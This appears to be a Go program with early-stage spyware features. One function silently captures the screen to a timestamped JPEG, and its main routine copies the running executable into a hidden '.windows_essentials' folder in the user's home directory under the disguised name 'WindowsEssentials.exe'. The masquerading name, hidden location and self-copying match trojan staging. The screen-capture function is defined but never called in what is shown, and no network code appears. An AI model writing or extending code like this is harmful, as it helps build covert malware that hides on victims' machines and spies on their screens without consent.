package main

import (
	"fmt"
	"image/jpeg"
	"io"
	"os"
	"path/filepath"
	"time"

	"github.com/kbinani/screenshot"
)

func screenCapture() {
	fmt.Println("Screenshot...")

	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)

	if err != nil {
		fmt.Println("Error", err)
		return
	}

	currentTime := time.Now()
	fmt.Println(currentTime)
	formattedTime := currentTime.Format("2006_01_02_15_04_05")
	fmt.Println(formattedTime)

	fileName := formattedTime + ".jpg"
	file, err := os.Create(fileName)

	if err != nil {
		fmt.Println("Error", err)
		return
	}

	defer file.Close()
	jpegQuality := 60

	err = jpeg.Encode(file, img, &jpeg.Options{Quality: jpegQuality})

	if err != nil {
		fmt.Println("Error", err)
		return
	}

	fmt.Println("Error", err)

}

func copySelf(destination string) error {
	destination = destination + "\\WindowsEssentials.exe"

	_, err := os.Stat(destination)

	if err == nil {
		fmt.Println("File already exists", err)
		return err
	}

	if !os.IsNotExist(err) {
		fmt.Println("error checking file", err)
		return err
	}

	execPath, err := os.Executable()
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	srcFile, err := os.Open(execPath)
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	defer srcFile.Close()

	destFile, err := os.Create(destination)
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		fmt.Println("Error", err)
		return err
	}

	fmt.Println("File copied")

	return err
}

func main() {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("Error", err)
		return
	}

	fmt.Println(homeDir)

	destination := filepath.Join(homeDir, ".windows_essentials")
	fmt.Println(destination)

	copySelf(destination)
}
